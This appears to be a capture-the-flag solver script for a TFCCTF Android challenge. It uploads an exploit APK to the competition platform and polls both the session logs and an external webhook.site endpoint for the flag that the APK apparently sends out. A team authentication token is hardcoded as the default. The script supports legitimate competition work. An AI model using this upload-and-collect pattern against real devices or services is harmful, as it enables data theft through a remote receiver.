#!/usr/bin/env python3
import sys
import os
import requests
import json
import time

ANDROID_PLATFORM = "https://android.koth.pro"
DIR = os.path.dirname(os.path.abspath(__file__))
APK_PATH = os.path.join(DIR, "..", "exploit_aligned.apk")
if not os.path.exists(APK_PATH):
    APK_PATH = os.path.abspath("exploit_aligned.apk")
WEBHOOK_URL = "https://webhook.site/token/401bf10b-12f6-4690-999d-2e2795e6e33a/requests"

def run_exploit(team_token):
    print(f"[*] Logging in to {ANDROID_PLATFORM} with team token...")
    s = requests.Session()
    headers = {"X-Auth": team_token}
    
    resp = s.get(f"{ANDROID_PLATFORM}/login", headers=headers)
    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.status_code} {resp.text}")
        return None
    
    user_data = resp.json()
    print(f"[+] Logged in as: {user_data.get('name')}")
    
    print("[*] Checking challenges...")
    challs = s.get(f"{ANDROID_PLATFORM}/challenges", headers=headers).json()
    print(f"[+] Available challenges: {challs}")
    
    print(f"[*] Uploading exploit APK: {APK_PATH}...")
    with open(APK_PATH, "rb") as f:
        files = {
            "file": ("exploit_aligned.apk", f, "application/vnd.android.package-archive")
        }
        data = {
            "challenge": "ShipMe"
        }
        resp = s.post(f"{ANDROID_PLATFORM}/provision", headers=headers, data=data, files=files)
    
    if resp.status_code != 200:
        print(f"[-] Provision failed: {resp.status_code} {resp.text}")
        return None
    
    prov_data = resp.json()
    session_id = prov_data.get("session_id")
    print(f"[+] Session provisioned! Session ID: {session_id}")
    
    print("[*] Polling session logs and webhook for the flag...")
    flag = None
    for i in range(120):
        # 1. Check session logs
        try:
            log_resp = s.get(f"{ANDROID_PLATFORM}/session/{session_id}/logs", headers=headers)
            if log_resp.status_code == 200:
                logs = log_resp.json().get("logs", [])
                for log_line in logs:
                    print(f"    [LOG] {log_line}")
                    if "TFCCTF{" in log_line:
                        start = log_line.index("TFCCTF{")
                        end = log_line.index("}", start) + 1
                        flag = log_line[start:end]
                        print(f"[🎉] FLAG FOUND IN LOGS: {flag}")
                        break
        except Exception as e:
            print(f"[!] Log poll error: {e}")
            
        if flag:
            break
            
        # 2. Check webhook
        try:
            wh_resp = requests.get(WEBHOOK_URL, timeout=5)
            if wh_resp.status_code == 200:
                wh_data = wh_resp.json().get("data", [])
                for req in wh_data:
                    query = req.get("query", {})
                    if "flag" in query and "TFCCTF{" in query["flag"]:
                        flag = query["flag"]
                        print(f"[🎉] FLAG RECEIVED VIA WEBHOOK: {flag}")
                        break
        except Exception as e:
            pass
            
        if flag:
            break
            
        # 3. Check session status
        try:
            st_resp = s.get(f"{ANDROID_PLATFORM}/session/{session_id}/status", headers=headers)
            if st_resp.status_code == 200:
                st = st_resp.json()
                print(f"[*] Status ({i*2}s): {st}")
                if st.get("status") in ["finished", "failed", "timeout"]:
                    # Wait a moment and check logs once more
                    time.sleep(2)
                    log_resp = s.get(f"{ANDROID_PLATFORM}/session/{session_id}/logs", headers=headers)
                    if log_resp.status_code == 200:
                        for log_line in log_resp.json().get("logs", []):
                            print(f"    [FINAL LOG] {log_line}")
                            if "TFCCTF{" in log_line:
                                start = log_line.index("TFCCTF{")
                                end = log_line.index("}", start) + 1
                                flag = log_line[start:end]
                                print(f"[🎉] FLAG FOUND IN FINAL LOGS: {flag}")
                                break
                    if not flag:
                        print("[-] Session finished without capturing flag.")
                    break
        except Exception as e:
            pass
            
        time.sleep(2)
        
    return flag

if __name__ == "__main__":
    if len(sys.argv) > 1:
        token = sys.argv[1]
    else:
        token = "7971b1b098cf59348a33bb2855f138afd6cc2caf6f469275f997e49948f4a9fe"
    flag = run_exploit(token)
    if flag:
        flag_path = os.path.join(DIR, "..", "flag.txt")
        with open(flag_path, "w") as f:
            f.write(flag + "\n")
        print(f"[+] Saved flag to {flag_path}: {flag}")
